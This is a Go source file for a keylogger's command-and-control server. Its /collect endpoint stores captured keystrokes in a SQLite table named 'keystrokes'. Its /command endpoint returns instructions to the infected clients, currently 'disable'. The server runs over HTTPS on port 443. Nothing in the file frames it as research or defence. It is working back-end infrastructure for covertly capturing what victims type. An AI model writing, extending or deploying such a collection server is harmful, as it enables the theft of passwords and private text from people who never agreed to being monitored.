package main

import (
    "crypto/tls"
    "database/sql"
    "fmt"
    "io/ioutil"
    "log"
    "net/http"
    "os"

    _ "github.com/mattn/go-sqlite3"
)

var db *sql.DB

func main() {
    var err error

    // Initialize database
    db, err = sql.Open("sqlite3", "./keystrokes.db")
    if err != nil {
        log.Fatal(err)
    }
    defer db.Close()

    // Create table if not exists
    sqlStmt := `CREATE TABLE IF NOT EXISTS keystrokes (id INTEGER PRIMARY KEY AUTOINCREMENT, data TEXT);`
    _, err = db.Exec(sqlStmt)
    if err != nil {
        log.Fatalf("%q: %s\n", err, sqlStmt)
    }

    // Read server address from environment variable or use default
    serverAddr := os.Getenv("SERVER_ADDR")
    if serverAddr == "" {
        serverAddr = ":443"
    }

    // Set up HTTPS server
    mux := http.NewServeMux()
    mux.HandleFunc("/collect", collectHandler)
    mux.HandleFunc("/command", commandHandler)

    server := &http.Server{
        Addr:    serverAddr,
        Handler: mux,
        TLSConfig: &tls.Config{
            MinVersion: tls.VersionTLS12,
        },
    }

    log.Printf("Starting server on %s\n", serverAddr)
    err = server.ListenAndServeTLS("cert.pem", "key.pem")
    if err != nil {
        log.Fatal(err)
    }
}

func collectHandler(w http.ResponseWriter, r *http.Request) {
    if r.Method != http.MethodPost {
        http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
        return
    }

    body, err := ioutil.ReadAll(r.Body)
    if err != nil {
        http.Error(w, "Unable to read body", http.StatusInternalServerError)
        return
    }
    defer r.Body.Close()

    _, err = db.Exec("INSERT INTO keystrokes (data) VALUES (?)", string(body))
    if err != nil {
        http.Error(w, "Failed to store data", http.StatusInternalServerError)
        return
    }

    fmt.Fprintln(w, "Data received successfully")
}

func commandHandler(w http.ResponseWriter, r *http.Request) {
    // For now, simply return "disable"
    fmt.Fprintln(w, "disable")
}